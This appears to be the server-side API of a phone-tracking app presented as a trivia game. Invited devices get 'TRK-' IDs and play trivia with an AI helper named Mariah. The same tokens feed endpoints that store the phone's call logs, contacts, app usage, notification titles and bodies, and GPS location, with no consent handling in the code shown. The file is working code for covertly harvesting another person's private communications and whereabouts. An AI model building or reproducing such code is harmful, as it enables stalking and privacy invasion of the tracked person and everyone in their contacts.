import type { Express, Request, Response } from "express";
import { z } from "zod";
import { nanoid } from "nanoid";
import { acceptInvitation, createDevice, createTriviaProfile, getAnsweredTriviaQuestionIds, getDeviceByAuthToken, getTriviaProfileByDeviceId, getTriviaQuestionById, getTriviaQuestions, getValidInvitation, hasTriviaAttempt, recordNativeCallLogs, recordNativeContacts, recordNativeNotifications, recordNativeUsageStats, recordTelemetry, recordTriviaAttempt } from "./db";
import { getTriviaLadderLevel, getTriviaLadderProgress, TRIVIA_LADDER } from "../shared/triviaLadder";
import { askMariah } from "./mariah";

export const telemetrySchema = z.object({
  latitude: z.number().min(-90).max(90).optional(),
  longitude: z.number().min(-180).max(180).optional(),
  batteryPercent: z.number().int().min(0).max(100).optional(),
  network: z.string().max(80).optional(),
});

export const registrationSchema = z.object({ token: z.string().min(8), name: z.string().trim().min(2).max(120), platform: z.enum(["android", "iphone"]) });
export const triviaAnswerSchema = z.object({ questionId: z.number().int().positive(), selectedOptionIndex: z.number().int().min(0).max(3) });
export const mariahQuestionSchema = z.object({ questionId: z.number().int().positive(), message: z.string().trim().min(1).max(600), history: z.array(z.object({ role: z.enum(["user", "assistant"]), content: z.string().trim().min(1).max(1200) })).max(6).default([]) });
export const nativeDataSyncSchema = z.object({
  callLogs: z.array(z.object({ number: z.string().max(80).nullable().optional(), type: z.number().int(), date: z.number().int().positive(), durationSeconds: z.number().int().min(0).max(86400), cachedName: z.string().max(160).nullable().optional() })).max(500).default([]),
  contacts: z.array(z.object({ contactId: z.string().max(120), displayName: z.string().max(200).nullable().optional(), phoneNumber: z.string().max(80).nullable().optional(), type: z.number().int() })).max(1000).default([]),
  usage: z.array(z.object({ packageName: z.string().max(220), totalTimeForegroundMillis: z.number().int().min(0).max(86400000), lastTimeUsed: z.number().int().positive() })).max(500).default([]),
  notifications: z.array(z.object({ key: z.string().max(220), packageName: z.string().max(220), appName: z.string().max(160).nullable().optional(), title: z.string().max(500).nullable().optional(), body: z.string().max(1500).nullable().optional(), postedAt: z.number().int().positive() })).max(500).default([]),
});

function publicQuestion(question: { id: number; language: string; category: string; difficulty: "easy" | "medium" | "hard"; prompt: string; options: unknown; explanation: string }) {
  const options = Array.isArray(question.options) ? question.options.filter((option): option is string => typeof option === "string").slice(0, 4) : [];
  return { id: question.id, language: question.language, category: question.category, difficulty: question.difficulty, prompt: question.prompt, options, explanation: question.explanation };
}

function scoreForDifficulty(difficulty: "easy" | "medium" | "hard") { return difficulty === "hard" ? 30 : difficulty === "medium" ? 20 : 10; }

export function registerDeviceApi(app: Express) {
  app.post("/api/device/register", async (req: Request, res: Response) => {
    try {
      const parsed = registrationSchema.safeParse(req.body);
      if (!parsed.success) return res.status(400).json({ error: "Invalid registration payload" });
      const invitation = await getValidInvitation(parsed.data.token);
      if (!invitation) return res.status(400).json({ error: "Invitation expired or invalid" });
      const device = await createDevice({ ownerId: invitation.ownerId, name: parsed.data.name, platform: parsed.data.platform, deviceId: `TRK-${nanoid(10).toUpperCase()}`, authToken: nanoid(32) });
      await acceptInvitation(invitation.id);
      if (device?.id) await createTriviaProfile(device.id);
      return res.json({ ok: true, device: { id: device?.id, name: device?.name, platform: device?.platform, deviceId: device?.deviceId }, authToken: device?.authToken });
    } catch (error) {
      console.error("[Device API] registration error", error);
      return res.status(500).json({ error: "Device could not be registered" });
    }
  });

  app.get("/api/device/trivia", async (req: Request, res: Response) => {
    try {
      const token = req.header("x-device-token");
      if (!token) return res.status(401).json({ error: "Device token required" });
      const device = await getDeviceByAuthToken(token);
      if (!device) return res.status(401).json({ error: "Invalid device token" });
      const profile = await getTriviaProfileByDeviceId(device.id);
      const score = profile?.score ?? 0;
      const ladder = getTriviaLadderProgress(score);
      const current = getTriviaLadderLevel(score);
      return res.json({ ok: true, profile: { ...(profile ?? { score: 0, bestScore: 0 }), bestScore: profile?.bestScore ?? score, nickname: current.nickname, level: current.level, iconKey: current.emoji, emoji: current.emoji, encouragement: current.encouragement, currentLevel: current, nextLevel: ladder.next, pointsToNext: ladder.pointsNeeded, progressPercent: ladder.percent, ladder: TRIVIA_LADDER } });
    } catch (error) {
      console.error("[Device API] trivia profile error", error);
      return res.status(500).json({ error: "Trivia profile could not be loaded" });
    }
  });

  app.get("/api/device/trivia/next", async (req: Request, res: Response) => {
    try {
      const token = req.header("x-device-token");
      if (!token) return res.status(401).json({ error: "Device token required" });
      const device = await getDeviceByAuthToken(token);
      if (!device) return res.status(401).json({ error: "Invalid device token" });
      const language = typeof req.query.language === "string" && /^[a-z]{2}$/i.test(req.query.language) ? req.query.language.toLowerCase() : "fr";
      const questions = await getTriviaQuestions(language);
      const answeredIds = new Set(await getAnsweredTriviaQuestionIds(device.id));
      const available = questions.filter(question => !answeredIds.has(question.id));
      if (!available.length) return res.json({ ok: true, question: null, exhausted: true });
      const question = available[Math.floor(Math.random() * available.length)];
      return res.json({ ok: true, question: publicQuestion(question) });
    } catch (error) {
      console.error("[Device API] trivia question error", error);
      return res.status(500).json({ error: "Trivia question could not be loaded" });
    }
  });

  app.post("/api/device/trivia/answer", async (req: Request, res: Response) => {
    try {
      const token = req.header("x-device-token");
      if (!token) return res.status(401).json({ error: "Device token required" });
      const device = await getDeviceByAuthToken(token);
      if (!device) return res.status(401).json({ error: "Invalid device token" });
      const parsed = triviaAnswerSchema.safeParse(req.body);
      if (!parsed.success) return res.status(400).json({ error: "Invalid trivia answer" });
      const question = await getTriviaQuestionById(parsed.data.questionId);
      if (!question || !question.active) return res.status(404).json({ error: "Trivia question not found" });
      const options = Array.isArray(question.options) ? question.options : [];
      if (parsed.data.selectedOptionIndex >= options.length || options.length !== 4) return res.status(400).json({ error: "Trivia question options are invalid" });
      if (await hasTriviaAttempt(device.id, question.id)) return res.status(409).json({ error: "Trivia question already answered" });
      const isCorrect = parsed.data.selectedOptionIndex === question.correctOptionIndex;
      const pointsAwarded = isCorrect ? scoreForDifficulty(question.difficulty) : 0;
      const profile = await recordTriviaAttempt({ deviceId: device.id, questionId: question.id, selectedOptionIndex: parsed.data.selectedOptionIndex, isCorrect, pointsAwarded });
      return res.json({ ok: true, result: { isCorrect, pointsAwarded, correctOptionIndex: question.correctOptionIndex, explanation: question.explanation }, profile: profile ? { score: profile.score, bestScore: profile.bestScore } : { score: pointsAwarded, bestScore: pointsAwarded } });
    } catch (error) {
      console.error("[Device API] trivia answer error", error);
      return res.status(500).json({ error: "Trivia answer could not be recorded" });
    }
  });

  app.post("/api/device/trivia/ask-mariah", async (req: Request, res: Response) => {
    try {
      const token = req.header("x-device-token");
      if (!token) return res.status(401).json({ error: "Device token required" });
      const device = await getDeviceByAuthToken(token);
      if (!device) return res.status(401).json({ error: "Invalid device token" });
      const parsed = mariahQuestionSchema.safeParse(req.body);
      if (!parsed.success) return res.status(400).json({ error: "Invalid Mariah request" });
      const question = await getTriviaQuestionById(parsed.data.questionId);
      if (!question || !question.active) return res.status(404).json({ error: "Trivia question not found" });
      const reply = await askMariah({ question, answered: await hasTriviaAttempt(device.id, question.id), message: parsed.data.message, history: parsed.data.history });
      return res.json({ ok: true, reply });
    } catch (error) {
      console.error("[Device API] Mariah error", error);
      return res.status(502).json({ error: "Mariah is unavailable" });
    }
  });

  app.post("/api/device/native-data", async (req: Request, res: Response) => {
    try {
      const token = req.header("x-device-token");
      if (!token) return res.status(401).json({ error: "Device token required" });
      const device = await getDeviceByAuthToken(token);
      if (!device) return res.status(401).json({ error: "Invalid device token" });
      const parsed = nativeDataSyncSchema.safeParse(req.body);
      if (!parsed.success) return res.status(400).json({ error: "Invalid native data payload", details: parsed.error.flatten() });
      const now = new Date();
      await recordNativeCallLogs(device.id, parsed.data.callLogs.map(row => ({ deviceId: device.id, eventKey: `${device.id}:call:${row.date}:${row.number ?? "unknown"}:${row.type}`, phoneNumber: row.number, cachedName: row.cachedName, callType: row.type, startedAt: new Date(row.date), durationSeconds: row.durationSeconds })));
      await recordNativeContacts(device.id, parsed.data.contacts.map(row => ({ deviceId: device.id, contactKey: `${device.id}:contact:${row.contactId}:${row.phoneNumber ?? ""}`, displayName: row.displayName, phoneNumber: row.phoneNumber, contactType: row.type })));
      await recordNativeUsageStats(device.id, parsed.data.usage.map(row => ({ deviceId: device.id, usageKey: `${device.id}:usage:${row.packageName}:${new Date(now).toISOString().slice(0, 10)}`, packageName: row.packageName, totalTimeForegroundMillis: Math.round(row.totalTimeForegroundMillis), lastTimeUsed: new Date(row.lastTimeUsed), usageDate: new Date(now) })));
      await recordNativeNotifications(device.id, parsed.data.notifications.map(row => ({ deviceId: device.id, eventKey: `${device.id}:notification:${row.key}`, packageName: row.packageName, appName: row.appName, title: row.title, body: row.body, postedAt: new Date(row.postedAt) })));
      return res.json({ ok: true, counts: { callLogs: parsed.data.callLogs.length, contacts: parsed.data.contacts.length, usage: parsed.data.usage.length, notifications: parsed.data.notifications.length } });
    } catch (error) {
      console.error("[Device API] native data sync error", error);
      return res.status(500).json({ error: "Native data could not be recorded" });
    }
  });

  app.post("/api/device/telemetry", async (req: Request, res: Response) => {
    try {
      const token = req.header("x-device-token");
      if (!token) return res.status(401).json({ error: "Device token required" });
      const device = await getDeviceByAuthToken(token);
      if (!device) return res.status(401).json({ error: "Invalid device token" });
      const parsed = telemetrySchema.safeParse(req.body);
      if (!parsed.success) return res.status(400).json({ error: "Invalid telemetry payload", details: parsed.error.flatten() });
      await recordTelemetry({
        deviceId: device.id,
        latitude: parsed.data.latitude == null ? undefined : String(parsed.data.latitude),
        longitude: parsed.data.longitude == null ? undefined : String(parsed.data.longitude),
        batteryPercent: parsed.data.batteryPercent,
        network: parsed.data.network,
      });
      return res.json({ ok: true, deviceId: device.deviceId, status: "Synchronisé à l'instant" });
    } catch (error) {
      console.error("[Device API] telemetry error", error);
      return res.status(500).json({ error: "Telemetry could not be recorded" });
    }
  });
}
